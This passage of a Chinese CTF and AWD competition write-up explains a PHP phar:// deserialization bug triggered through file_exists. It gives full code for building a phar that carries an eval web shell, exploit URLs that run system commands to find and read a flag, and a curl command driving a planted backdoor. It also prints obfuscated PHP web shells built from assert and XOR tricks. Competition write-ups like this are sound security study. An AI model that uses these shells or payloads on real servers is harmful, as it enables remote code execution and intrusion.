</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>//http://172.16.17.2/file_aq12ws.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;filename&#39;</span>])){
</span></span><span style=display:flex><span>$filename<span style=color:#f92672>=</span>$_GET[<span style=color:#e6db74>&#39;filename&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MyClass</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> $output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;echo &#34;hahaha&#34;;&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __destruct()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>eval</span>($this <span style=color:#f92672>-&gt;</span> <span style=color:#a6e22e>output</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>file_exists</span>($filename);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>这是前段时间black hat上提到的利用phar伪协议在一些文件系统函数中触发反序列化漏洞。</p><p>phar文件本质上是一个压缩文件，在manifest部分存放每个被压缩文件的权限、属性等信息和用户自定义的meta-data数据，后者是以序列化后的形式存在的。而PHP中大部分文件系统函数在通过 <code>phar://</code> 伪协议解析phar文件时，都会将meta-data反序列化。因此就有了本题的反序列化触发点file_exists函数。除了file_exists还有下图所示的函数，详见 <a href=https://paper.seebug.org/680/>利用 phar 拓展 php 反序列化漏洞攻击面</a> 。</p><p><img loading=lazy src=17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s alt=img></p><p>所以本题的思路是先生成一个meta-data中包含恶意object的phar文件，然后通过上传点上传该文件得到路径，再在 <code>file_aq12ws.php</code> 通过filename参数以<code>phar://</code> 方式包含该文件，就将在file_exists函数处触发phar文件的meta-data的反序列化，就可以得到一个web shell。</p><p>要生成phar文件，需要 phar.readonly 为Off，即值为0。而出于安全性考虑，该项默认使能，值为1。当php.ini文件中的phar.readonly值为0时，可以使用ini_set在脚本中设为1或0；当值为1时，只能通过修改php.ini文件来修改值而不能通过脚本修改。也就是说，我们需要在生成phar文件前修改php.ini中phar.readonly值的Off。详细说明见 <a href=http://php.net/manual/en/phar.configuration.php#ini.phar.readonly>文档</a> 。</p><p>生成phar包的代码如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MyClass</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>var</span> $output <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;@eval($_GET[&#34;cmd&#34;]);&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __destruct()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>eval</span>($this <span style=color:#f92672>-&gt;</span> <span style=color:#a6e22e>output</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>    $evil_object<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>MyClass</span>();<span style=color:#75715e>//生成恶意对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    $file_name<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;test.phar&#34;</span>;<span style=color:#75715e>//后缀必须为phar
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>file_exists</span>($file_name))<span style=color:#a6e22e>unlink</span>(<span style=color:#e6db74>&#39;test.phar&#39;</span>);<span style=color:#75715e>//删除当前目录下已有的phar包
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $phar<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Phar</span>($file_name);
</span></span><span style=display:flex><span>    $phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>startBuffering</span>();
</span></span><span style=display:flex><span>    $phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setStub</span>(<span style=color:#e6db74>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span>);<span style=color:#75715e>//设置stub，可理解为phar文件的标志
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setMetadata</span>($evil_object);<span style=color:#75715e>//将恶意对象作为自定义的meta-data传入manifest
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addFromString</span>(<span style=color:#e6db74>&#34;foo.txt&#34;</span>,<span style=color:#e6db74>&#34;bar&#34;</span>);<span style=color:#75715e>//添加压缩文件及其内容
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    $phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>stopBuffering</span>();
</span></span></code></pre></td></tr></table></div></div><p>访问该代码后目录下会生成<code>test.phar</code> 文件，重命名为<code>test.gif</code> ，上传后访问 <code>target.ip/file_aq12ws.php?filename=phar://test.gif&amp;cmd=phpinfo();</code> 见到phpinfo页面就说明成功了。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ xxd test.phar
</span></span><span style=display:flex><span>00000000: 3c3f <span style=color:#ae81ff>7068</span> <span style=color:#ae81ff>7020</span> 5f5f <span style=color:#ae81ff>4841</span> 4c54 5f43 4f4d  &lt;?php __HALT_COM
</span></span><span style=display:flex><span>00000010: <span style=color:#ae81ff>5049</span> 4c45 <span style=color:#ae81ff>5228</span> 293b 203f 3e0d 0a70 <span style=color:#ae81ff>0000</span>  PILER<span style=color:#f92672>()</span>; ?&gt;..p..
</span></span><span style=display:flex><span>00000020: <span style=color:#ae81ff>0001</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0011</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0001</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span> 003b  ...............;
</span></span><span style=display:flex><span>00000030: <span style=color:#ae81ff>0000</span> 004f 3a37 3a22 4d79 436c <span style=color:#ae81ff>6173</span> <span style=color:#ae81ff>7322</span>  ...O:7:<span style=color:#e6db74>&#34;MyClass&#34;</span>
</span></span><span style=display:flex><span>00000040: 3a31 3a7b 733a 363a 226f <span style=color:#ae81ff>7574</span> <span style=color:#ae81ff>7075</span> <span style=color:#ae81ff>7422</span>  :1:<span style=color:#f92672>{</span>s:6:<span style=color:#e6db74>&#34;output&#34;</span>
</span></span><span style=display:flex><span>00000050: 3b73 3a32 303a <span style=color:#ae81ff>2240</span> <span style=color:#ae81ff>6576</span> 616c <span style=color:#ae81ff>2824</span> 5f47  ;s:20:<span style=color:#e6db74>&#34;@eval(</span>$_G<span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>00000060: 4554 5b22 636d 6422 5d29 3b22 3b7d 0700  ET[&#34;</span>cmd<span style=color:#e6db74>&#34;]);&#34;</span>;<span style=color:#f92672>}</span>..
</span></span><span style=display:flex><span>00000070: <span style=color:#ae81ff>0000</span> 666f 6f2e <span style=color:#ae81ff>7478</span> <span style=color:#ae81ff>7403</span> <span style=color:#ae81ff>0000</span> 000a 5ffb  ..foo.txt....._.
</span></span><span style=display:flex><span>00000080: 5b03 <span style=color:#ae81ff>0000</span> 00aa 8cff 76b6 <span style=color:#ae81ff>0100</span> <span style=color:#ae81ff>0000</span> <span style=color:#ae81ff>0000</span>  <span style=color:#f92672>[</span>.......v.......
</span></span><span style=display:flex><span>00000090: <span style=color:#ae81ff>0062</span> <span style=color:#ae81ff>6172</span> <span style=color:#ae81ff>7533</span> <span style=color:#ae81ff>2162</span> c819 a6d5 <span style=color:#ae81ff>6019</span> ab22  .baru3!b....<span style=color:#e6db74>`</span>..<span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>000000a0: 7e2e f1df 96d7 b375 0200 0000 4742 4d42  ~......u....GBMB
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#ae81ff>172.16</span><span style=color:#f92672>.</span><span style=color:#ae81ff>17.2</span><span style=color:#f92672>/</span><span style=color:#a6e22e>file_aq12ws</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>filename</span><span style=color:#f92672>=</span><span style=color:#a6e22e>phar</span><span style=color:#f92672>://</span><span style=color:#a6e22e>upload_file</span><span style=color:#f92672>/</span><span style=color:#a6e22e>phphphar2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>gif</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>a</span><span style=color:#f92672>=</span><span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#39;find / | grep flag&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#ae81ff>172.16</span><span style=color:#f92672>.</span><span style=color:#ae81ff>17.2</span><span style=color:#f92672>/</span><span style=color:#a6e22e>file_aq12ws</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>filename</span><span style=color:#f92672>=</span><span style=color:#a6e22e>phar</span><span style=color:#f92672>://</span><span style=color:#a6e22e>upload_file</span><span style=color:#f92672>/</span><span style=color:#a6e22e>phphphar2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>gif</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>a</span><span style=color:#f92672>=</span><span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#39;cat /var/www/html/sdf3r_df3erdf/flag.txt&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>flag</span>{<span style=color:#a6e22e>qwe3_89fdsf3_jjnj3ioxc_ozxov</span>}
</span></span></code></pre></td></tr></table></div></div><h1 id=awd>AWD<a hidden class=anchor aria-hidden=true href=#awd>#</a></h1><h2 id=web-1>Web<a hidden class=anchor aria-hidden=true href=#web-1>#</a></h2><p><strong>attack</strong></p><p>一上来D盾扫出几个后门。用其中一个连了菜刀，在<code>E:\wwwroot\RequestFlag\</code> 发现<code>url.bat</code> ，内容为：<code>curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key</code> ，在目标机上执行该命令可以得到对方flag。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl <span style=color:#e6db74>&#34;http://172.16.18.13/wordpress/wp-includes/customize/class-wp-customize-background-image-list.php&#34;</span> -d <span style=color:#e6db74>&#34;-7=system(&#39;E:\wwwroot\RequestFlag\curl.exe https://FlagServer.com:9000/flag --cacert E:\wwwroot\RequestFlag\ca.crt --cert E:\wwwroot\RequestFlag\client.crt --key E:\wwwroot\RequestFlag\client.key&#39;);&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>用的木马是<code>wwwroot\wordpress\wp-includes\customize\class-wp-customize-background-image-list.php</code> ，相当于<code>@assert(${_POST}[-7]);</code> 。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#f92672>@</span>$_ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;s&#34;</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;s&#34;</span> <span style=color:#f92672>.</span> <span style=color:#75715e>/*-/*-*/</span><span style=color:#e6db74>&#34;e&#34;</span> <span style=color:#f92672>.</span> <span style=color:#75715e>/*-/*-*/</span><span style=color:#e6db74>&#34;r&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>@</span>$_ <span style=color:#f92672>=</span> <span style=color:#75715e>/*-/*-*/</span><span style=color:#e6db74>&#34;a&#34;</span> <span style=color:#f92672>.</span> <span style=color:#75715e>/*-/*-*/</span>$_ <span style=color:#f92672>.</span> <span style=color:#75715e>/*-/*-*/</span><span style=color:#e6db74>&#34;t&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>@</span>$_<span style=color:#75715e>/*-/*-*/</span>(<span style=color:#960050;background-color:#1e0010>$</span><span style=color:#75715e>/*-/*-*/</span>{<span style=color:#e6db74>&#34;_P&#34;</span> <span style=color:#f92672>.</span> <span style=color:#75715e>/*-/*-*/</span><span style=color:#e6db74>&#34;OS&#34;</span> <span style=color:#f92672>.</span> <span style=color:#75715e>/*-/*-*/</span><span style=color:#e6db74>&#34;T&#34;</span>}
</span></span><span style=display:flex><span>	[<span style=color:#75715e>/*-/*-*/</span><span style=color:#ae81ff>0</span><span style=color:#75715e>/*-/*-*/</span> <span style=color:#f92672>-</span> <span style=color:#75715e>/*-/*-*/</span><span style=color:#ae81ff>2</span><span style=color:#75715e>/*-/*-*/</span> <span style=color:#f92672>-</span> <span style=color:#75715e>/*-/*-*/</span><span style=color:#ae81ff>5</span><span style=color:#75715e>/*-/*-*/</span>]);
</span></span></code></pre></td></tr></table></div></div><p>在WAF上配了一些敏感字符正则后观察日志，发现另一个大家用的比较多的后门，<code>wwwroot\wordpress\wp-includes\pomo\tp.php</code> ，等价于<code>@ASsERT(eval(@$_POST[cmd]));</code> 。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span>{(<span style=color:#e6db74>&#34;#&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;|&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;#&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;|&#34;</span>)} <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#34;!&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;`&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;( &#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;{&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;(&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;[&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;~&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;;&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;|&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;.&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;*&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;~&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#f92672>@</span><span style=color:#960050;background-color:#1e0010>$</span>{(<span style=color:#e6db74>&#34;#&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;|&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;#&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;|&#34;</span>)}((<span style=color:#e6db74>&#34;-&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;H&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;]&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;+&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;[&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;:&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;,&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;@&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;}&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;U&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;~&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;&gt;&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;e&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;A&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;(&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;j&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;:&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;i&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;&amp;&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;#&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;p&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;&gt;&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;j&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;!&#34;</span> <span style=color:#f92672>^</span> <span style=color:#e6db74>&#34;z&#34;</span>) <span style=color:#f92672>.</span> (<span style=color:#e6db74>&#34;]&#34;</span> <span 